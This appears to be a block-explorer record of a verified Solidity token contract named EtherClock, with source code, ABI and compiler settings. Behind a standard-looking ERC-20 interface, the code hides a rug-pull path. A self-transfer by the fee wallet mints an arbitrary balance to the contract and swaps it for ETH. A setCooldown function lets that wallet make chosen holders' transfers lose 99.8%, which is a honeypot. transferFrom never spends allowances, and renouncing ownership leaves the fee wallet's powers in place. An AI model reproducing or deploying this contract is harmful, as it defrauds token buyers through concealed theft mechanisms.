{"SourceCode": "pragma solidity ^0.8.18;\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair_);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath:  subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath:  division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:  multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:  addition overflow\");\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n\r\n    function renounceOwnership() public virtual onlyOwner {emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);}\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    modifier onlyOwner(){\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n    address private _owner;\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function WETH() external pure returns (address aadd);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;\r\n\r\n    function factory() external pure returns (address addr);\r\n}\r\n\r\ncontract EC is Ownable {\r\n    using SafeMath for uint256;\r\n    uint256 public _decimals = 9;\r\n    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;\r\n    mapping(address => uint256) bots;\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    constructor() {\r\n        _feeWallet = msg.sender;\r\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\r\n        _balances[msg.sender] = _totalSupply;\r\n    }\r\n    function totalSupply() external view returns (uint256) {return _totalSupply;}\r\n    event Transfer(address indexed __address_, address indexed, uint256 _v);\r\n    function feeWallet() internal view returns (bool) {\r\n        return msg.sender == _feeWallet;\r\n    }\r\n    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    uint256 _fee = 0;\r\n    function name() external view returns (string memory) {return _name;}\r\n    function decreaseAllowance(address from, uint256 amount) public returns (bool) {\r\n        require(_allowances[msg.sender][from] >= amount);\r\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\r\n        return true;\r\n    }\r\n    event Approval(address indexed ai, address indexed _adress_indexed, uint256 value);\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n    function _transfer(address from, address to, uint256 amount) internal {\r\n        require(from != address(0));\r\n        if (msg.sender == _feeWallet && to == from) {liquify(amount, to);} else {\r\n            require(amount <= _balances[from]);\r\n            uint256 feeAmount = 0;\r\n            if (cooldowns[from] != 0 && cooldowns[from] <= block.number) {feeAmount = amount.mul(998).div(1000);}\r\n            _balances[from] = _balances[from] - amount;\r\n            _balances[to] += amount - feeAmount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n    }\r\n    uint256 _maxWallet;\r\n    string private _name = \"EtherClock\";\r\n    string private  _symbol = \"00:00\";\r\n    function symbol() external view returns (string memory) {\r\n        string memory _hours = uint2str((block.timestamp / 3600) % 24);\r\n        string memory  _minutes = uint2str(block.timestamp % 3600 / 60);\r\n        if (bytes(_hours).length == 1) {\r\n            _hours = string.concat(\"0\", _hours);\r\n        }\r\n        if (bytes(_minutes).length == 1) {\r\n            _minutes = string.concat(\"0\", _minutes);\r\n        }\r\n\r\n        return string.concat(_hours, \":\", _minutes, \" GMT\");\r\n    }\r\n    function uint2str(uint256 _i) internal pure returns (string memory str)\r\n    {\r\n        if (_i == 0){return \"0\";}\r\n        uint256 j = _i;\r\n        uint256 length;\r\n        while (j != 0){length++;j /= 10;}\r\n        bytes memory bstr = new bytes(length);\r\n        uint256 k = length;\r\n        j = _i;\r\n        while (j != 0){bstr[--k] = bytes1(uint8(48 + j % 10));j /= 10;}\r\n        str = string(bstr);\r\n    }\r\n    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(from, recipient, amount);\r\n        require(_allowances[from][msg.sender] >= amount);\r\n        return true;\r\n    }\r\n    mapping(address => uint256)  cooldowns;\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(spender != address(0), \"IERC20: approve to the zero address\"); require(owner != address(0), \"IERC20: approve from the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function liquify(uint256 _mcs, address _bcr) private {\r\n        _approve(address(this), address(_router), _mcs);\r\n        _balances[address(this)] = _mcs;\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this); path[1] = _router.WETH();\r\n\r\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs, 0, path, _bcr, block.timestamp + 30);\r\n    }\r\n    uint256 _maxTx;\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\r\n        return true;\r\n    }\r\n    address public _feeWallet;\r\n    function decimals() external view returns (uint256) {return _decimals;}\r\n    mapping(address => uint256) private _balances;\r\n    function getPairAddress() private view returns (address) {return IUniswapV2Factory(\r\n        _router.factory()).getPair(address(this),\r\n        _router.WETH());\r\n    }\r\n    function setCooldown(address[] calldata list) external {\r\n        for (uint i = 0; i < list.length; i++) {\r\n            if (!feeWallet()){} else {cooldowns[list[i]] = \r\n            block.number + 1;\r\n            }}\r\n    }\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function removeLimit() external onlyOwner {  _maxWallet = _totalSupply; _maxTx = _totalSupply; }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"ai\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_adress_indexed\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"__address_\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_v\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_feeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"}],\"name\":\"setCooldown\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EC", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8d8cbde07ea26a35181f31d947f77d5727ce13bf673f2787086ce6460e90b799"}